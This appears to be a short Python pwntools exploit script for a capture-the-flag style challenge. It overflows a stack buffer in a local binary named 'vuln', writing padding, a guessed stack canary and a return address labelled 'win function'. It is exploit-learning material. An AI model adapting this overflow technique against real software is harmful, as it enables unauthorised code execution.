import struct
from pwn import *

p = process("./vuln")

exploit = ""
exploit += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH" # padding
exploit += "test" # canary value
exploit += "aaaaaaaaaaaaaaaa" # more padding
exploit += struct.pack('I', 0x80486eb) # win function

print p.recvuntil('>')
p.sendline("64");

print p.recvuntil('>')
p.sendline(exploit)

print p.recvall()

p.close()
